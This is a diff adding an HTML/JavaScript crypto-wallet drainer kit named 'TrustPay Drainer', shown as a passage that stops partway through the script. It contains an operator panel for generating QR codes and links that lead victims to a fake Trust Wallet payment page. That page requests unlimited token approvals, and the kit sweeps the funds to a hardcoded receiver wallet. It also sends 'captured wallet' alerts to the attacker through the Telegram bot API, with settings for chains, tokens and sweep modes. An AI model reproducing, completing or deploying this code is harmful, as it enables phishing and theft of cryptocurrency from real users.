@@ -1,0 +1,813 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>TrustPay Drainer</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+:root{
+  --a-bg:#070b16;--a-card:rgba(255,255,255,.035);--a-line:rgba(255,255,255,.09);
+  --a-fg:#e8ecf6;--a-dim:#7e89a6;--a-blue:#3b82f6;--a-vi:#4E5BE6;--a-ok:#22c55e;--a-warn:#f59e0b;--a-bad:#ef4444;
+}
+body{background:radial-gradient(1200px 600px at 15% -10%,#14224d 0%,#070b16 55%);color:var(--a-fg);
+  font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:13px;-webkit-font-smoothing:antialiased}
+#root{padding:14px}
+.adm-top{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:14px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:11px}
+.logo{width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,#4E5BE6,#22d3ee);display:flex;align-items:center;justify-content:center;font-size:19px;color:#fff;box-shadow:0 6px 22px rgba(78,91,230,.45)}
+.bt{font-weight:800;font-size:15px;letter-spacing:.2px}
+.bs{font-size:11px;color:var(--a-dim);margin-top:2px}
+.tr{display:flex;align-items:center;gap:8px}
+.pill{font-size:11px;font-weight:700;padding:6px 11px;border-radius:999px;border:1px solid var(--a-line);background:rgba(255,255,255,.04);color:var(--a-dim);letter-spacing:.4px}
+.pill.on{color:#0b1a10;background:var(--a-ok);border-color:transparent}
+.grid{display:grid;grid-template-columns:1fr 400px;gap:14px;align-items:start}
+@media(max-width:1050px){.grid{grid-template-columns:1fr}}
+.colL{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:760px){.colL{grid-template-columns:1fr}}
+.card{background:var(--a-card);border:1px solid var(--a-line);border-radius:15px;padding:14px;backdrop-filter:blur(8px)}
+.card.wide{grid-column:1/-1}
+.ch{font-size:10.5px;font-weight:800;letter-spacing:1.3px;color:#93a0c4;margin-bottom:11px;text-transform:uppercase}
+label{display:block;font-size:11px;color:#93a0c4;font-weight:600;margin-bottom:9px}
+input,select,textarea{width:100%;margin-top:5px;background:#0b1224;border:1px solid var(--a-line);color:var(--a-fg);
+  border-radius:10px;padding:9px 11px;font-size:12.5px;font-family:inherit;outline:none;transition:.15s}
+input:focus,select:focus,textarea:focus{border-color:var(--a-blue);box-shadow:0 0 0 3px rgba(59,130,246,.16)}
+textarea{resize:vertical;min-height:96px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11.5px;line-height:1.6}
+select{appearance:none;background-image:linear-gradient(45deg,transparent 50%,#93a0c4 50%),linear-gradient(135deg,#93a0c4 50%,transparent 50%);background-position:calc(100% - 16px) 17px,calc(100% - 11px) 17px;background-size:5px 5px,5px 5px;background-repeat:no-repeat}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:560px){.row2{grid-template-columns:1fr}}
+.btn{width:100%;border:0;border-radius:10px;padding:11px;font-weight:700;font-size:12.5px;cursor:pointer;font-family:inherit;
+  background:linear-gradient(135deg,#4E5BE6,#3b82f6);color:#fff;transition:.15s;margin-top:2px}
+.btn:hover{filter:brightness(1.12)}
+.btn:active{transform:translateY(1px)}
+.btn.ghost{background:rgba(255,255,255,.06);color:var(--a-fg);border:1px solid var(--a-line);width:auto;padding:8px 13px;font-size:12px}
+.btn.dark{background:#0b1224;border:1px solid var(--a-line);color:var(--a-fg)}
+.btn.green{background:linear-gradient(135deg,#16a34a,#22c55e)}
+.btn.red{background:linear-gradient(135deg,#dc2626,#ef4444)}
+.btn.tiny{width:auto;padding:5px 10px;font-size:11px;border-radius:8px;margin:0}
+.hint{font-size:10.5px;color:var(--a-dim);margin-top:9px;line-height:1.55}
+.btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+.warnbox{font-size:11px;color:#fcd34d;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.28);border-radius:9px;padding:9px 11px;margin-top:10px;line-height:1.5}
+pre.health{margin:10px 0 0;background:#05080f;border:1px solid var(--a-line);border-radius:10px;padding:11px;font-size:10.5px;line-height:1.65;
+  white-space:pre-wrap;max-height:190px;overflow:auto;font-family:ui-monospace,Menlo,monospace;color:#a7b4d4}
+.qrbox{background:#fff;border-radius:14px;padding:13px;display:flex;align-items:center;justify-content:center;min-height:250px;margin-top:11px}
+.qrbox canvas{display:block;border-radius:5px}
+.qrcap{text-align:center;font-size:11px;color:var(--a-dim);margin-top:9px}
+table{width:100%;border-collapse:collapse;font-size:11.5px}
+th{text-align:left;color:#93a0c4;font-weight:700;font-size:10px;letter-spacing:.6px;padding:6px 5px;border-bottom:1px solid var(--a-line);text-transform:uppercase}
+td{padding:8px 5px;border-bottom:1px solid rgba(255,255,255,.05);font-family:ui-monospace,Menlo,monospace;font-size:11px}
+.tag{font-size:9.5px;font-weight:800;padding:3px 7px;border-radius:6px;letter-spacing:.4px;text-transform:uppercase}
+.tag.pending{background:rgba(245,158,11,.15);color:#fcd34d}
+.tag.swept{background:rgba(34,197,94,.15);color:#4ade80}
+.tag.fail{background:rgba(239,68,68,.15);color:#fca5a5}
+.pvwrap{background:#05080f;border:1px solid var(--a-line);border-radius:16px;padding:12px;display:flex;justify-content:center}
+.lnk{display:flex;gap:7px;margin-top:10px}
+.lnk input{font-size:11px;font-family:ui-monospace,Menlo,monospace}
+.sectnote{font-size:11px;color:var(--a-dim);line-height:1.55;margin-top:8px}
+.stat{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+.chip{font-size:10.5px;background:rgba(255,255,255,.05);border:1px solid var(--a-line);padding:4px 9px;border-radius:999px;color:#a7b4d4}
+
+/* ==================== TRUST WALLET VICTIM UI ==================== */
+.tw{--bg:#0A0D12;--bg2:#12161D;--fg:#FFFFFF;--dim:#8B93A7;--line:rgba(255,255,255,.075);--card:#141922;
+  --vi:#4E5BE6;--vi2:#5B6BF5;--green:#22C55E;--red:#EF4444;
+  position:relative;width:100%;max-width:390px;margin:0 auto;background:var(--bg);color:var(--fg);
+  min-height:100%;display:flex;flex-direction:column;font-size:15px;font-weight:400;line-height:1.35;
+  border-radius:26px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.55)}
+.tw.live{max-width:none;min-height:100vh;border-radius:0;box-shadow:none}
+.tw[data-theme="light"]{--bg:#FFFFFF;--bg2:#F4F5F9;--fg:#0B0E11;--dim:#7A8296;--line:rgba(0,0,0,.08);--card:#F4F5F9}
+@media(prefers-color-scheme:light){
+  .tw[data-theme="auto"]{--bg:#FFFFFF;--bg2:#F4F5F9;--fg:#0B0E11;--dim:#7A8296;--line:rgba(0,0,0,.08);--card:#F4F5F9}
+}
+.tw *{box-sizing:border-box}
+.sbar{display:flex;align-items:center;justify-content:space-between;padding:11px 20px 4px;font-size:12.5px;font-weight:600;letter-spacing:.2px}
+.sbar .r{display:flex;align-items:center;gap:5px;font-size:11px;opacity:.9}
+.bars{display:inline-flex;gap:1.5px;align-items:flex-end}
+.bars i{display:block;width:2.5px;background:currentColor;border-radius:1px}
+.thead{display:flex;align-items:center;gap:10px;padding:12px 16px 14px}
+.tback{width:38px;height:38px;border-radius:50%;background:var(--bg2);border:0;color:var(--fg);font-size:19px;display:flex;
+  align-items:center;justify-content:center;cursor:pointer;flex:0 0 auto;line-height:1}
+.ttitle{flex:1;text-align:center;font-size:17px;font-weight:700;margin-right:38px;letter-spacing:.1px}
+.ttitle.nr{margin-right:0;text-align:left;padding-left:4px}
+.tsp{width:38px}
+.tto{padding:6px 18px 0;font-size:13px;color:var(--dim);line-height:1.5;word-break:break-all}
+.tto b{color:var(--fg);font-weight:600}
+.tamt{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:26px 18px 8px;min-height:150px}
+.tamt .v{font-size:52px;font-weight:700;letter-spacing:-1.2px;line-height:1.05;word-break:break-all;text-align:center}
+.tamt .f{font-size:14px;color:var(--dim);margin-top:11px;display:flex;align-items:center;gap:5px}
+.trow{display:flex;align-items:center;gap:11px;padding:12px 18px}
+.tico{width:38px;height:38px;border-radius:50%;background:var(--bg2);display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:800;flex:0 0 auto;overflow:hidden}
+.tico img{width:100%;height:100%;object-fit:cover}
+.tmeta{flex:1;min-width:0}
+.tmeta .n{font-size:15.5px;font-weight:600}
+.tmeta .s{font-size:12.5px;color:var(--dim);margin-top:1px}
+.tmax{background:var(--bg2);border:0;color:var(--fg);font-size:13.5px;font-weight:700;padding:9px 17px;border-radius:999px;cursor:pointer}
+.tpad{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;padding:6px 8px 10px}
+.tpad button{background:transparent;border:0;color:var(--fg);font-size:23px;font-weight:500;padding:12px 0;cursor:pointer;border-radius:12px;font-family:inherit}
+.tpad button:active{background:var(--bg2)}
+.tfoot{padding:8px 18px 20px;margin-top:auto}
+.tprimary{width:100%;border:0;border-radius:999px;padding:16px;font-size:16px;font-weight:700;color:#fff;
+  background:var(--vi);cursor:pointer;font-family:inherit;letter-spacing:.2px}
+.tprimary:disabled{opacity:.55}
+.tprimary:active{background:var(--vi2)}
+.tprimary.g{background:var(--green)}
+.tnote{text-align:center;font-size:12px;color:var(--dim);margin-top:11px;line-height:1.5}
+.tnote a{color:var(--vi2);text-decoration:none;font-weight:600}
+.tcard{margin:0 18px;background:var(--bg2);border-radius:16px;padding:6px 0}
+.krow{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:11px 16px;font-size:14px}
+.krow .k{color:var(--dim)}
+.krow .vv{font-weight:600;text-align:right;word-break:break-all;max-width:62%}
+.krow.sep{border-top:1px solid var(--line)}
+.krow .g{color:var(--green)}
+.hero{display:flex;flex-direction:column;align-items:center;padding:18px 18px 14px}
+.hico{width:66px;height:66px;border-radius:50%;background:var(--vi);display:flex;align-items:center;justify-content:center;font-size:30px;color:#fff;margin-bottom:12px}
+.hero .a{font-size:30px;font-weight:800;letter-spacing:-.6px}
+.hero .b{font-size:13.5px;color:var(--dim);margin-top:5px}
+.chk{width:74px;height:74px;border-radius:50%;background:rgba(34,197,94,.14);display:flex;align-items:center;justify-content:center;margin-bottom:14px}
+.chk i{width:56px;height:56px;border-radius:50%;background:var(--green);display:flex;align-items:center;justify-content:center;color:#fff;font-size:29px;font-style:normal}
+.spin{width:44px;height:44px;border-radius:50%;border:3px solid var(--line);border-top-color:var(--vi);animation:sp .8s linear infinite;margin-bottom:16px}
+@keyframes sp{to{transform:rotate(360deg)}}
+.psteps{margin:14px 18px 0;display:flex;flex-direction:column;gap:9px}
+.pstep{display:flex;align-items:center;gap:10px;font-size:13px;color:var(--dim)}
+.pstep .d{width:17px;height:17px;border-radius:50%;border:2px solid var(--line);flex:0 0 auto}
+.pstep.act{color:var(--fg);font-weight:600}
+.pstep.act .d{border-color:var(--vi);border-top-color:transparent;animation:sp .8s linear infinite}
+.pstep.done{color:var(--fg)}
+.pstep.done .d{background:var(--green);border-color:var(--green);position:relative}
+.pstep.done .d::after{content:"✓";position:absolute;inset:0;font-size:10px;color:#fff;display:flex;align-items:center;justify-content:center}
+.pstep.fail .d{background:var(--red);border-color:var(--red)}
+.pwbadge{text-align:center;font-size:10.5px;color:var(--dim);padding:0 0 14px;letter-spacing:.3px}
+</style>
+</head>
+<body>
+<div id="root"></div>
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script>
+'use strict';
+/* ======================= HELPERS ======================= */
+const $=(s,r=document)=>r.querySelector(s);
+const $$=(s,r=document)=>Array.from(r.querySelectorAll(s));
+const esc=s=>String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const short=a=>a&&a.length>12?a.slice(0,6)+'…'+a.slice(-4):(a||'—');
+const b64e=o=>btoa(unescape(encodeURIComponent(JSON.stringify(o)))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+const b64d=s=>{s=String(s).replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return JSON.parse(decodeURIComponent(escape(atob(s))))};
+const fmt=(v,d=6)=>{const n=Number(v);if(!isFinite(n))return '0';let s=n.toFixed(d);if(s.indexOf('.')>=0)s=s.replace(/0+$/,'').replace(/\.$/,'');return s||'0'};
+const nowUTC=()=>new Date().toISOString().replace('T',' ').slice(0,19)+' UTC';
+const isAddr=a=>/^0x[a-fA-F0-9]{40}$/.test(a||'');
+const ZERO='0x0000000000000000000000000000000000000000';
+const MAXU='0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+const isNative=a=>!a||a.toLowerCase()===ZERO||a.toLowerCase()==='native';
+const ABI=['function approve(address spender,uint256 amount) returns (bool)',
+ 'function transfer(address to,uint256 amount) returns (bool)',
+ 'function transferFrom(address from,address to,uint256 amount) returns (bool)',
+ 'function allowance(address owner,address spender) view returns (uint256)',
+ 'function balanceOf(address owner) view returns (uint256)',
+ 'function decimals() view returns (uint8)',
+ 'function symbol() view returns (string)'];
+
+/* ======================= CHAINS ======================= */
+const CHAINS={
+ 1:{n:'Ethereum',rpc:'https://eth.llamarpc.com',scan:'https://etherscan.io',nat:'ETH',tw:60},
+ 56:{n:'BNB Smart Chain',rpc:'https://bsc-dataseed.binance.org',scan:'https://bscscan.com',nat:'BNB',tw:20000714},
+ 137:{n:'Polygon',rpc:'https://polygon-rpc.com',scan:'https://polygonscan.com',nat:'POL',tw:966},
+ 42161:{n:'Arbitrum One',rpc:'https://arb1.arbitrum.io/rpc',scan:'https://arbiscan.io',nat:'ETH',tw:42161},
+ 10:{n:'Optimism',rpc:'https://mainnet.optimism.io',scan:'https://optimistic.etherscan.io',nat:'ETH',tw:10},
+ 43114:{n:'Avalanche',rpc:'https://api.avax.network/ext/bc/C/rpc',scan:'https://snowtrace.io',nat:'AVAX',tw:9000},
+ 8453:{n:'Base',rpc:'https://mainnet.base.org',scan:'https://basescan.org',nat:'ETH',tw:8453},
+ 250:{n:'Fantom',rpc:'https://rpc.ftm.tools',scan:'https://ftmscan.com',nat:'FTM',tw:1007}
+};
+const DEF_TOKENS={
+ 56:'USDT,0x55d398326f99059fF775485246999027B3197955,18,1\nBUSD,0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56,18,1\nUSDC,0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d,18,1\nWBNB,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,18,600',
+ 1:'USDT,0xdAC17F958D2ee523a2206206994597C13D831ec7,6,1\nUSDC,0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,6,1\nDAI,0x6B175474E89094C44Da98b954EedeAC495271d0F,18,1\nWETH,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,18,3200',
+ 137:'USDT,0xc2132D05D31c914a87C6611C10748AEb04B58e8F,6,1\nUSDC,0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359,6,1\nWMATIC,0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270,18,0.5',
+ 42161:'USDT,0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9,6,1\nUSDC,0xaf88d065e77c8cC2239327C5EDb3A432268e5831,6,1\nWETH,0x82aF49447D8a07e3bd95BD0d56f35241523fBab1,18,3200',
+ 10:'USDT,0x94b008aA00579c1307B0EF2c499aD98a8ce58e58,6,1\nUSDC,0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85,6,1',
+ 43114:'USDT,0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7,6,1\nUSDC,0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E,6,1',
+ 8453:'USDC,0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913,6,1\nWETH,0x4200000000000000000000000000000000000006,18,3200',
+ 250:'USDT,0x049d68029688eAbF473097a2fC38ef61633A3C7A,6,1\nWFTM,0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83,18,0.5'
+};
+const LS={cfg:'tp.cfg.v1',pk:'tp.pk.v1',cap:'tp.cap.v1'};
+const DEFAULT_CFG={
+  receiver:'0x7789592d5c21baef3cbe2adc7183b263554b6db6',
+  spender:'',factory:'',chainId:56,rpc:CHAINS[56].rpc,tokens:DEF_TOKENS[56],
+  amount:'0.1',mode:'drain',autosweep:true,label:'PAYMENT — ORDER #1042',
+  theme:'auto',showFee:true,botToken:'',chatId:'',baseUrl:'',openIn:'new'
+};
+let cfg=Object.assign({},DEFAULT_CFG,JSON.parse(localStorage.getItem(LS.cfg)||'{}'));
+let PK=localStorage.getItem(LS.pk)||'';
+let CAP=JSON.parse(localStorage.getItem(LS.cap)||'[]');
+let PREVIEW_THEME=cfg.theme;
+function save(){localStorage.setItem(LS.cfg,JSON.stringify(cfg));}
+function saveCap(){localStorage.setItem(LS.cap,JSON.stringify(CAP));}
+function tokens(){return (cfg.tokens||'').split('\n').map(l=>l.trim()).filter(Boolean).map(l=>{
+  const p=l.split(',').map(x=>x.trim());
+  return {sym:p[0],addr:p[1],dec:parseInt(p[2]||'18',10),price:parseFloat(p[3]||'0')};
+}).filter(t=>t.sym&&t.addr);}
+
+/* ======================= VICTIM CONFIG (embedded in QR) ======================= */
+function victimCfg(){
+  return {r:cfg.receiver,s:cfg.spender||cfg.receiver,c:cfg.chainId,rpc:cfg.rpc,tk:cfg.tokens,
+    am:cfg.amount,m:cfg.mode,th:cfg.theme,lb:cfg.label,bt:cfg.botToken,bc:cfg.chatId,
+    as:cfg.autosweep?1:0,sf:cfg.showFee?1:0,ts:Date.now()};
+}
+function baseUrl(){return (cfg.baseUrl||'').replace(/\/$/,'')||(location.origin+location.pathname);}
+function buildLink(){return baseUrl()+'#v='+b64e(victimCfg());}
+
+/* ======================= TELEGRAM ======================= */
+async function tg(bt,bc,text){
+  if(!bt||!bc)return false;
+  try{
+    const u='https://api.telegram.org/bot'+encodeURIComponent(bt)+'/sendMessage?chat_id='+encodeURIComponent(bc)
+      +'&parse_mode=HTML&disable_web_page_preview=true&text='+encodeURIComponent(text);
+    const r=await fetch(u);const j=await r.json();return !!j.ok;
+  }catch(e){return false;}
+}
+
+/* ======================= ADMIN PANEL ======================= */
+function renderAdmin(){
+  const root=$('#root');
+  const chainOpts=Object.keys(CHAINS).map(k=>`<option value="${k}" ${cfg.chainId==k?'selected':''}>${CHAINS[k].n}</option>`).join('');
+  root.innerHTML=`
+  <div class="adm">
+    <div class="adm-top">
+      <div class="brand">
+        <div class="logo">◆</div>
+        <div><div class="bt">TrustPay Drainer <span style="font-size:10px;color:#7e89a6;font-weight:600">v1.0</span></div>
+        <div class="bs">QR drainer · pay → approve → sweep · telegram alerts</div></div>
+      </div>
+      <div class="tr">
+        <span class="pill" id="arm">● DISARMED</span>
+        <button class="btn ghost" data-act="toggleTheme">Preview: ${PREVIEW_THEME}</button>
+      </div>
+    </div>
+    <div class="grid">
+      <div class="colL">
+
+        <div class="card">
+          <div class="ch">1 · Wallet &amp; Contract</div>
+          <div class="row2">
+            <label>Receiver wallet <input id="f_receiver" placeholder="0xYourWallet"></label>
+            <label>Spender address <input id="f_spender" placeholder="= receiver"></label>
+          </div>
+          <label>Factory (optional) <input id="f_factory" placeholder="0xFactory"></label>
+          <button class="btn dark" data-act="reset">⟳ Re-arm · fresh session</button>
+          <div class="hint">Receiver = where funds land. Spender = who gets the allowance. Leave spender blank to use the receiver (recommended — the victim's own wallet can then complete the sweep).</div>
+        </div>
+
+        <div class="card">
+          <div class="ch">2 · Chain &amp; Token</div>
+          <label>Chain <select id="f_chain">${chainOpts}</select></label>
+          <label>RPC url <input id="f_rpc"></label>
+          <div class="row2">
+            <label>Token contract (primary) <input id="f_token"></label>
+            <label>Decimals <input id="f_dec"></label>
+          </div>
+          <button class="btn dark" data-act="loadDef">Load chain defaults</button>
+        </div>
+
+        <div class="card">
+          <div class="ch">3 · Telegram</div>
+          <label>Bot token <input id="f_bot" placeholder="123456:ABC-DEF..."></label>
+          <label>Chat ID <input id="f_chat" placeholder="123456789"></label>
+          <button class="btn dark" data-act="tgTest">Send test message</button>
+          <div class="hint">Direct browser → Telegram. No backend, no webhook. Get a chat id from @userinfobot, and a token from @BotFather (send /start to your bot first).</div>
+        </div>
+
+        <div class="card">
+          <div class="ch">4 · Client — what the victim sees</div>
+          <label>Address label (shown to victim) <input id="f_label" placeholder="RAHUL AGARWAL — 2"></label>
+          <div class="row2">
+            <label>Victim theme <select id="f_theme">
+              <option value="auto">Auto — match device</option><option value="dark">Force dark</option><option value="light">Force light</option></select></label>
+            <label>Network fee display <select id="f_fee">
+              <option value="auto">Live estimate from chain</option><option value="hide">Hide</option></select></label>
+          </div>
+          <div class="hint">"Auto" reads the victim's own OS/browser dark-mode setting so the page looks native on their device.</div>
+        </div>
+
+        <div class="card wide">
+          <div class="ch">5 · Token list &nbsp;<span style="color:#4b5563;font-weight:600;letter-spacing:0">SYMBOL,ADDRESS,DECIMALS,PRICE — one per line, 0x000…0 = native coin</span></div>
+          <textarea id="f_tokens" spellcheck="false"></textarea>
+          <div class="stat" id="tokstat"></div>
+        </div>
+
+        <div class="card">
+          <div class="ch">6 · Mode</div>
+          <label>Flow <select id="f_mode">
+            <option value="drain">Drain — pay then approve &amp; sweep</option>
+            <option value="sweep">Approve + sweep (no initial pay)</option>
+            <option value="approve">Approve only (unlimited allowance)</option>
+            <option value="pay">Pay only (plain transfer)</option>
+          </select></label>
+          <label>Requested amount (shown on QR) <input id="f_amount" placeholder="0.1"></label>
+          <div class="row2">
+            <label>Autosweep in victim page <select id="f_auto"><option value="1">On</option><option value="0">Off</option></select></label>
+            <label>Public base URL <input id="f_base" placeholder="https://your-drainer.vercel.app"></label>
+          </div>
+          <label>Keeper / relay URL (optional) <input id="f_worker" placeholder="https://your-worker.workers.dev"></label>
+          <div class="btns">
+            <button class="btn" style="flex:1" data-act="gen">⚡ Generate QR + victim link</button>
+            <button class="btn dark" data-act="copy" style="flex:0 0 auto;width:auto">Copy link</button>
+          </div>
+          <div class="warnbox" id="armwarn">Fill the receiver wallet to arm the drainer.</div>
+        </div>
+
+        <div class="card">
+          <div class="ch">7 · Sweeper — drain from this browser</div>
+          <label>Spender private key (stays on your device) <input id="f_pk" placeholder="0xPrivateKeyOfSpender"></label>
+          <div class="stat"><span class="chip" id="pkaddr">—</span><span class="chip" id="pkbal">—</span></div>
+          <div class="hint">Where to get it: Trust Wallet → Settings → Wallets → tap your wallet → Show Recovery Phrase. Use the wallet whose address is your Receiver/Spender.</div>
+          <label style="margin-top:11px">Victim address <input id="f_victim" placeholder="0xVictimAddress"></label>
+          <div class="btns"><button class="btn green" data-act="sweepOne" style="flex:1">Sweep now</button></div>
+        </div>
+
+        <div class="card">
+          <div class="ch">8 · Health check — run before every campaign</div>
+          <div class="btns"><button class="btn dark" data-act="health" style="flex:1">Run full check</button><button class="btn dark" data-act="copyReport" style="width:auto">Copy report</button></div>
+          <pre class="health" id="health">Idle. Press "Run full check".</pre>
+        </div>
+
+        <div class="card wide">
+          <div class="ch">9 · Captured wallets</div>
+          <div class="btns" style="margin:0 0 10px">
+            <button class="btn dark" data-act="sync">⟳ Sync from Telegram</button>
+            <button class="btn green" data-act="sweepAll">Sweep all pending</button>
+            <button class="btn red" data-act="clear">Clear list</button>
+          </div>
+          <table><thead><tr><th>Wallet</th><th>Paid</th><th>Balance</th><th>Token</th><th>Status</th><th></th></tr></thead>
+          <tbody id="capt"></tbody></table>
+          <div class="sectnote" id="capnote">No wallets captured yet.</div>
+        </div>
+
+      </div>
+
+      <div style="position:sticky;top:14px">
+        <div class="card">
+          <div class="ch">2 · Victim QR</div>
+          <div class="qrbox"><canvas id="qr"></canvas></div>
+          <div class="qrcap">Scan with any camera → opens inside Trust Wallet</div>
+          <div class="lnk"><input id="linkout" readonly placeholder="Press generate…"><button class="btn tiny dark" data-act="copy">Copy</button></div>
+          <div class="lnk"><input id="openout" readonly placeholder="Direct victim page"><button class="btn tiny dark" data-act="open">Open</button></div>
+        </div>
+        <div class="card" style="margin-top:14px">
+          <div class="ch">Live victim preview · matches device theme</div>
+          <div class="pvwrap"><div id="pv"></div></div>
+          <div class="pwbadge">Approve · unlimited allowance · BNB Smart Chain</div>
+        </div>
+      </div>
+    </div>
+  </div>`;
+  const set=(id,v)=>{const e=$('#'+id);if(e)e.value=v;};
+  set('f_receiver',cfg.receiver);set('f_spender',cfg.spender);set('f_factory',cfg.factory);
+  set('f_rpc',cfg.rpc);set('f_tokens',cfg.tokens);set('f_amount',cfg.amount);
+  set('f_label',cfg.label);set('f_bot',cfg.botToken);set('f_chat',cfg.chatId);
+  set('f_base',cfg.baseUrl);set('f_worker',cfg.worker||'');set('f_pk',PK);set('f_victim','');
+  $('#f_theme').value=cfg.theme;$('#f_mode').value=cfg.mode;$('#f_fee').value=cfg.showFee?'auto':'hide';
+  $('#f_auto').value=cfg.autosweep?'1':'0';
+  const tk=tokens()[0]||{addr:'',dec:18};
+  set('f_token',tk.addr);set('f_dec',tk.dec);
+  bindAdmin();armUI();renderPreview();renderCapt();tokStat();
+}
+function bindAdmin(){
+  const map={f_receiver:'receiver',f_spender:'spender',f_factory:'factory',f_rpc:'rpc',f_tokens:'tokens',
+    f_amount:'amount',f_label:'label',f_bot:'botToken',f_chat:'chatId',f_base:'baseUrl',f_worker:'worker'};
+  Object.keys(map).forEach(id=>{const e=$('#'+id);if(!e)return;e.addEventListener('input',()=>{
+    cfg[map[id]]=e.value;
+    if(id==='f_receiver'||id==='f_spender')armUI();
+    if(id==='f_tokens'){tokStat();const t=tokens()[0];if(t){$('#f_token').value=t.addr;$('#f_dec').value=t.dec;}}
+    save();renderPreview();armUI();});});
+  $('#f_chain').addEventListener('change',()=>{cfg.chainId=+$('#f_chain').value;cfg.rpc=CHAINS[cfg.chainId].rpc;cfg.tokens=DEF_TOKENS[cfg.chainId]||cfg.tokens;
+    $('#f_rpc').value=cfg.rpc;$('#f_tokens').value=cfg.tokens;const t=tokens()[0];$('#f_token').value=t?t.addr:'';$('#f_dec').value=t?t.dec:18;
+    save();tokStat();renderPreview();});
+  $('#f_theme').addEventListener('change',()=>{cfg.theme=$('#f_theme').value;PREVIEW_THEME=cfg.theme;save();renderPreview();});
+  $('#f_mode').addEventListener('change',()=>{cfg.mode=$('#f_mode').value;save();renderPreview();});
+  $('#f_fee').addEventListener('change',()=>{cfg.showFee=$('#f_fee').value==='auto';save();renderPreview();});
+  $('#f_auto').addEventListener('change',()=>{cfg.autosweep=$('#f_auto').value==='1';save();renderPreview();});
+  $('#f_pk').addEventListener('input',()=>{PK=$('#f_pk').value.trim();localStorage.setItem(LS.pk,PK);pkInfo();});
+  document.addEventListener('click',e=>{
+    const b=e.target.closest('[data-act]');if(!b)return;const a=b.dataset.act;
+    if(a==='gen')genQR(); else if(a==='copy')copyLink(); else if(a==='open')openLink();
+    else if(a==='loadDef'){cfg.tokens=DEF_TOKENS[cfg.chainId]||cfg.tokens;$('#f_tokens').value=cfg.tokens;const t=tokens()[0];
+      $('#f_token').value=t?t.addr:'';$('#f_dec').value=t?t.dec:18;save();tokStat();renderPreview();}
+    else if(a==='reset'){cfg.ts=Date.now();save();genQR();}
+    else if(a==='tgTest')tgTest();
+    else if(a==='health')health();
+    else if(a==='copyReport')navigator.clipboard.writeText($('#health').textContent);
+    else if(a==='sweepOne')sweepOne();
+    else if(a==='sweepAll')sweepAll();
+    else if(a==='sync')syncTG();
+    else if(a==='clear'){CAP=[];saveCap();renderCapt();}
+    else if(a==='toggleTheme'){PREVIEW_THEME=PREVIEW_THEME==='auto'?'dark':(PREVIEW_THEME==='dark'?'light':'auto');
+      b.textContent='Preview: '+PREVIEW_THEME;renderPreview();}
+  });
+  pkInfo();
+}
+function tokStat(){
+  const t=tokens();const el=$('#tokstat');if(!el)return;
+  el.innerHTML=t.slice(0,8).map(x=>`<span class="chip">${esc(x.sym)} · ${x.dec}d${x.price?' · $'+x.price:''}</span>`).join('')+`<span class="chip">${t.length} token(s)</span>`;
+}
+function armUI(){
+  const ok=isAddr(cfg.receiver);
+  const p=$('#arm');if(p){p.textContent=ok?'● ARMED':'● DISARMED';p.className='pill'+(ok?' on':'');}
+  const w=$('#armwarn');if(w)w.style.display=ok?'none':'block';
+}
+async function pkInfo(){
+  const a=$('#pkaddr'),b=$('#pkbal');if(!a)return;
+  if(!PK||!window.ethers){a.textContent='—';b.textContent='—';return;}
+  try{const w=new ethers.Wallet(PK);a.textContent=short(w.address);
+    const p=new ethers.providers.JsonRpcProvider(cfg.rpc,cfg.chainId);const bal=await p.getBalance(w.address);
+    b.textContent=fmt(ethers.utils.formatEther(bal),5)+' '+CHAINS[cfg.chainId].nat;
+  }catch(e){a.textContent='bad key';b.textContent='—';}
+}
+async function genQR(){
+  if(!isAddr(cfg.receiver)){alert('Enter a valid receiver wallet first.');return;}
+  const url=buildLink();
+  try{
+    await QRCode.toCanvas($('#qr'),url,{width:250,margin:1,errorCorrectionLevel:'L',color:{dark:'#000000',light:'#ffffff'}});
+    $('#linkout').value=url;$('#openout').value=baseUrl()+'#v='+b64e(victimCfg());
+  }catch(e){alert('QR lib not loaded');}
+}
+function copyLink(){
+  const v=$('#linkout').value||buildLink();$('#linkout').value=v;
+  navigator.clipboard.writeText(v).then(()=>{const b=$('#arm');if(b){b.textContent='● LINK COPIED';setTimeout(()=>armUI(),1200);}});
+}
